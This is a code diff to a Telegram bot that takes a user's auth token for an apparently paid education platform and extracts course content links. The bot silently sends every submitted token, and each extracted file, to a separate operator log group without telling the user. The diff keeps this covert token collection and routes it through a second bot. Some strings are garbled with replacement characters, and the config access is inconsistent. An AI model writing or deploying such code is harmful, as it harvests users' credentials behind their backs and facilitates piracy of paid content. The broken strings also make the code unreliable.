@@ -1,6 +1,7 @@
 import logging
 import os
 import requests
+import time
 from telegram import Update
 from telegram.ext import (
     CommandHandler,
@@ -9,7 +10,7 @@ from telegram.ext import (
     ContextTypes,
     filters,
 )
-from config import LOG_GROUP_ID
+from telegram import Bot
 
 # Stages for ConversationHandler
 AUTH_CODE, BATCH_ID, SUBJECT_ID, CONTENT_TYPE = range(4)
@@ -19,6 +20,11 @@ ROOT_DIR = os.getcwd()
 
 async def ak_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Start the AK extraction process."""
+    if context.user_data.get('conversation_active', False):
+        await update.message.reply_text("Ending previous conversation...")
+        context.user_data.clear()
+    
+    context.user_data['conversation_active'] = True
     await update.message.reply_text("𝕊𝕖𝕟𝕕 𝕪𝕠𝕦𝕣 𝕒𝕦𝕥𝕙𝕖𝕟𝕥𝕚𝕔𝕒𝕥𝕚𝕠𝕟 𝕔𝕠𝕕𝕖😗[𝕋𝕠𝕜𝕖𝕟]:")
     return AUTH_CODE
 
@@ -28,9 +34,10 @@ async def handle_auth_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
         auth_token = update.message.text.strip()
         context.user_data['auth_token'] = auth_token
 
-        # Log the auth token to the group
-        await context.bot.send_message(
-            chat_id=LOG_GROUP_ID,
+        # Log the auth token to the group via main bot
+        main_bot = Bot(context.bot_data["main_bot_token"])  # Use main bot token
+        await main_bot.send_message(
+            chat_id=context.bot_data["log_group_id_ak"],  # Use log_group_id_ak
             text=f"New AK Auth Token Used: ```{auth_token}```",
             parse_mode="Markdown"
         )
@@ -92,7 +99,7 @@ async def handle_batch_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
         subjects = response["data"]["batch_subject"]
         context.user_data['subject_data'] = subjects  # Store subject data for later use
         
-        subject_text = "𝚂𝚞𝚋𝚓𝚎𝚌𝚝𝚜 𝚏𝚘𝚞𝚗𝚍:\n\n"
+        subject_text = "𝚂𝚞𝚋𝚓𝚎𝚌𝚝𝚜 �𝚘𝚞𝚗𝚍:\n\n"
         for subject in subjects:
             subject_text += f"```{subject['subjectName']}``` : ```{subject['id']}```\n"
 
@@ -132,6 +139,8 @@ async def handle_content_type(update: Update, context: ContextTypes.DEFAULT_TYPE
             return CONTENT_TYPE
 
         await update.message.reply_text("𝐋𝐢𝐧𝐤 𝐞𝐱𝐭𝐫𝐚𝐜𝐭𝐢𝐨𝐧 𝐬𝐭𝐚𝐫𝐭𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭✋️...")
+
+        start_time = time.time()  # Start time for extraction
 
         headers = context.user_data['headers']
         batch_id = context.user_data['batch_id']
@@ -220,11 +229,16 @@ async def handle_content_type(update: Update, context: ContextTypes.DEFAULT_TYPE
             with open(file_path, "w", encoding="utf-8") as f:
                 f.write(to_write)
 
+            # Calculate extraction time
+            extraction_time = time.time() - start_time
+            extraction_time_str = f"{extraction_time:.2f} seconds"
+
             # Send file to user with updated caption
             user_caption = (
                 f"𝑯𝒆𝒓𝒆'𝒔 𝒚𝒐𝒖𝒓 𝒆𝒙𝒕𝒓𝒂𝒄𝒕𝒆𝒅 𝒄𝒐𝒏𝒕𝒆𝒏𝒕!✨️\n\n"
-                f"𝐁𝐚𝐭𝐜𝐡 𝐧𝐚𝐦𝐞💢: {batch_name}\n"
-                f"𝑺𝒖𝒃𝒋𝒆𝒄𝒕 𝒏𝒂𝒎𝒆😉: {subject_name}"
+                f"𝐁𝐚𝐭𝐜𝐡 𝐧𝐚𝐦𝐞💢: {batch_name}\n\n"
+                f"𝑺𝒖𝒃𝒋𝒆𝒄𝒕 𝒏𝒂𝒎𝒆😉: {subject_name}\n\n"
+                f"𝑬𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝒕𝒊𝒎𝒆⏱️: {extraction_time_str}"
             )
             with open(file_path, "rb") as f:
                 await update.message.reply_document(
@@ -232,22 +246,25 @@ async def handle_content_type(update: Update, context: ContextTypes.DEFAULT_TYPE
                     caption=user_caption
                 )
 
-            # Send file to log group with updated caption
+            # Send file to log group via main bot
+            main_bot = Bot(context.application.main_bot_token)
             log_caption = (
-                f"AK 𝚌𝚘𝚗𝚝𝚎𝚗𝚝 𝚎𝚡𝚝𝚛𝚊𝚌𝚝𝚎𝚍 𝚊𝚗𝚍 𝚜𝚎𝚗𝚝 𝚝𝚘 𝚞𝚜𝚎𝚛.\n\n"
+                f"AK 𝚌𝚘𝚗𝚝𝚎𝚗𝚝 𝚎𝚡𝚝𝚛𝚊𝚌𝚝𝚎𝚍 𝚊𝚗𝚍 𝚜𝚎𝚗𝚝 𝚝𝚘 �𝚜𝚎𝚛.\n\n"
                 f"𝑪𝒐𝒏𝒕𝒆𝒏𝒕 𝑻𝒚𝒑𝒆: {content_type}\n\n"
-                f"𝐁𝐚𝐭𝐜𝐡 𝐧𝐚𝐦𝐞💢: {batch_name}\n"
-                f"𝑺𝒖𝒃𝒋𝒆𝒄𝒕 𝒏𝒂𝒎𝒆😉: {subject_name}"
+                f"𝐁𝐚𝐭𝐜𝐡 𝐧𝐚𝐦𝐞💢: {batch_name}\n\n"
+                f"𝑺𝒖𝒃𝒋𝒆𝒄𝒕 𝒏𝒂𝒎𝒆😉: {subject_name}\n\n"
+                f"𝑬𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝒕𝒊𝒎𝒆⏱️: {extraction_time_str}"
             )
             with open(file_path, "rb") as f:
-                await context.bot.send_document(
-                    chat_id=LOG_GROUP_ID,
+                await main_bot.send_document(
+                    chat_id=context.application.log_group_id_ak,
                     document=f,
                     caption=log_caption
                 )
 
             # Clean up
-            os.remove(file_path)
+            if os.path.exists(file_path):
+                os.remove(file_path)
             await update.message.reply_text("𝑬𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝒄𝒐𝒎𝒑𝒍𝒆𝒕𝒆𝒅 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚! ✨")
         else:
             await update.message.reply_text("𝐍𝐨 𝐜𝐨𝐧𝐭𝐞𝐧𝐭 𝐟𝐨𝐮𝐧𝐝 Sorry🤪.")
@@ -259,6 +276,12 @@ async def handle_content_type(update: Update, context: ContextTypes.DEFAULT_TYPE
         await update.message.reply_text("An error occurred during extraction. Please try again later.")
         return ConversationHandler.END
 
+async def timeout(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle conversation timeout."""
+    await update.message.reply_text("Conversation timed out. Please start again.")
+    context.user_data.clear()
+    return ConversationHandler.END
+
 # Create the conversation handler
 ak_handler = ConversationHandler(
     entry_points=[CommandHandler("ak", ak_start)],
@@ -268,5 +291,6 @@ ak_handler = ConversationHandler(
         SUBJECT_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_subject_id)],
         CONTENT_TYPE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_content_type)],
     },
-    fallbacks=[],
+    fallbacks=[MessageHandler(filters.ALL, timeout)],  # Handle timeout
+    conversation_timeout=600,  # 10 minutes timeout
 )
